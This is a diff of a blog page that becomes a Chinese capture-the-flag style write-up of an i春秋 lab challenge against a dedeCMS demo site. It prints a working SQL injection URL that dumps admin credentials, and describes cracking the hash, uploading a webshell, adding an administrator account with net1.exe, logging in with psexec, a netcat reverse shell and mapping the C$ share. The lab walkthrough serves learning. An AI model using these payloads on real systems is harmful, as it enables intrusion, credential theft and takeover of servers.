@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Archives | yuzunzz.github.io</title>
+  <title>i春秋渗透实验——真的很简单 | yuzunzz.github.io</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -191,85 +191,70 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-
-
-<section id="services">
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/07/16/pen_test/">i春秋渗透实验——渗透测试笔记</a></h4>
-                            
-                            <p><time datetime="2016-07-16T05:51:41.000Z"><a href="/2016/07/16/pen_test/">2016-07-16</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/07/16/true_simple/">i春秋渗透实验——真的很简单</a></h4>
-                            
-                            <p><time datetime="2016-07-15T17:17:42.000Z"><a href="/2016/07/16/true_simple/">2016-07-16</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/04/21/gnome_ubuntu_server_vino/">ubuntu_server_vino</a></h4>
-                            
-                            <p><time datetime="2016-04-20T16:22:18.000Z"><a href="/2016/04/21/gnome_ubuntu_server_vino/">2016-04-21</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/04/19/chm_play/">组合技——chm玩耍</a></h4>
-                            
-                            <p><time datetime="2016-04-19T12:06:58.000Z"><a href="/2016/04/19/chm_play/">2016-04-19</a></time></p>
-                        </div>
-                    
-                        
-                            </div><div class="row boxes">
-                            
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/04/19/gnome-shell-vpn/">gnome_shell_vpn</a></h4>
-                            
-                            <p><time datetime="2016-04-19T12:06:58.000Z"><a href="/2016/04/19/gnome-shell-vpn/">2016-04-19</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/04/08/vmware_expand_root_capacity/">将装在VMware Workstation上的Ubuntu根分区扩容</a></h4>
-                            
-                            <p><time datetime="2016-04-08T05:29:38.000Z"><a href="/2016/04/08/vmware_expand_root_capacity/">2016-04-08</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2016-07-15T17:17:42.000Z" itemprop="datePublished">
+          2016-07-16
+      </time>
+    
+    
+    | 
+    <a href='/tags/ichunqiu/'>ichunqiu</a>
+    
+    
+</span>
+                <h1>i春秋渗透实验——真的很简单</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<h3 id="0x00-挑战任务概览"><a href="#0x00-挑战任务概览" class="headerlink" title="0x00 挑战任务概览"></a>0x00 挑战任务概览</h3><p><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_1.png" alt="true_simple_1.png"></p>
+<p>提示描述很明确，这是个基于dedeCMS搭建的demo站点，dedeCMS比较经典的就是13年的/plus/recommend.php注入漏洞，构造出语句可以直接爆出管理员的账号密码。</p>
+<p><code>/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=111</code></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2013-046375" target="_blank" rel="external">漏洞相关信息</a><br><a href="http://www.freebuf.com/sectool/27206.html" target="_blank" rel="external">payload</a></p>
+<p>最终目标是获取web服务器administrator用户桌面上的flag文件内容。那么思路就很明确了，首先要将webshell传上服务器，然后测试webshell的权限，权限不够的话再想办法提升权限，最后获取到flag文件的内容。</p>
+<h3 id="0x01-拿下站点管理员账号"><a href="#0x01-拿下站点管理员账号" class="headerlink" title="0x01 拿下站点管理员账号"></a>0x01 拿下站点管理员账号</h3><p>题目描述中给了个工具链接，下载下来直接输入目标网站域名(其实就是访问<code>/plus/recommend.php？action=…</code>)<br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_2.png" alt="true_simple_2.png"></p>
+<p>dedeCMS将密码明文先进行md5(32位小写)加密，然后取生成的32位哈希值的第6-26位存储在数据库中。而16位md5哈希值是取32位md5哈希值的第9-25位。<br>这里通过注入所得到的密文<code>adab29e084ff095ce3eb</code>为20位字符，由上文可以知道，去除密文的前三位和最后一位后就是明文的16位md5值。通过在线的md5库可以查出管理员密码为<code>only_system</code>。</p>
+<h3 id="0x02-寻找dedeCMS后台地址"><a href="#0x02-寻找dedeCMS后台地址" class="headerlink" title="0x02 寻找dedeCMS后台地址"></a>0x02 寻找dedeCMS后台地址</h3><p>有了账号和密码，接下来该找CMS的后台地址。dedeCMS默认的后台地址为<code>/dede</code>。如果管理员将后台地址更改了，可以访问<code>/data/mysql_error_trace.inc</code>、<code>/data/mysqli_error_trace.inc</code>，可能记录了后台地址，可以尝试结合关键词查找。<br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_3.png" alt="true_simple_3.png"></p>
+<h3 id="0x03-获取服务器权限"><a href="#0x03-获取服务器权限" class="headerlink" title="0x03 获取服务器权限"></a>0x03 获取服务器权限</h3><p>登录后台后，发现没有最好用的文件式管理器，然而这里getshell的方法太多了…<br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_4.png" alt="true_simple_4.png"></p>
+<p>更改系统限制上传的文件扩展名，添加上php就能上传webshell了。<br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_5.png" alt="true_simple_5.png"></p>
+<p><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_6.png" alt="true_simple_6.png"></p>
+<p><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_7.png" alt="true_simple_7.png"></p>
+<p><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_8.png" alt="true_simple_8.png"></p>
+<p>用菜刀访问administrator用户的桌面文件夹，可以看到文件名但无法获得文件内容，很明显是权限不够。执行<code>net user</code>和<code>net1 user</code>,都回显无法访问，同样是权限不够。尝试了几种办法，比如上传cmd.exe来设置为菜刀的shell、nc反弹shell、Churrasco.exe(巴西烤肉)提权执行命令等，都没有成功。</p>
+<p>上传net.exe和net1.exe，执行发现上传的net1.exe可以使用。<br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_9.png" alt="true_simple_9.png"></p>
+<p><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_10.png" alt="true_simple_10.png"></p>
+<p>添加一个新用户，设置为管理员组成员。</p>
+<p><code>net1.exe user admin admin123 /add</code><br><code>net1.exe localgroup administrator admin /add</code></p>
+<p>也可以不上传net1.exe，通过上传工具包里的提权工具ms11046.exe、ms11080.exe，执行即可添加用户(这个工具包里面的似乎没法执行任意命令啊。。。)</p>
+<p>已经有了系统的管理员用户，只要能登录服务器就可以查看到文件了。<br><del>尝试了远程桌面连接的方式，不过一直没有成功</del>。<br>用psexec登录上去，切换至桌面目录。<br><code>psexec \\172.16.12.2 -u admin -p admin123 cmd.exe</code><br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_11.png" alt="true_simple_11.png"><br>这里就很尴尬了，通过psexec获得的命令行，输入中文会乱码，而flag文件偏偏在一个中文文件夹内。<br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_12.png" alt="true_simple_12.png"></p>
+<p>不过现在是admin用户，用nc反弹个shell回去的话，权限也将会是admin用户的权限，再在反弹回去的shell中切换至桌面文件夹查看flag文件就行了。<br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_13.png" alt="true_simple_13.png"></p>
+<p><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_14.png" alt="true_simple_14.png"></p>
+<p>也可以不去登陆服务器，直接把服务器上的磁盘分区映射到本地。<br><code>net use z: \\172.16.12.2\c$</code><br><img src="https://static.yuzunzz.top/images/2017/01/01/true_simple_15.png" alt="true_simple_15.png"></p>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>虽然还没想好写点什么，但是总觉得这里放句话比较和谐。</p>
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="pagination" role="pagination">
+    
+    <a class="pull-left" href="/2016/07/16/pen_test/" style="float: left;">
+        ← i春秋渗透实验——渗透测试笔记
+    </a>
+    
+    
+    <a class="pull-right" href="/2016/04/21/gnome_ubuntu_server_vino/">
+        ubuntu_server_vino →
+    </a>
+    
+</nav>
+
+        <div class="duoshuo"></div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
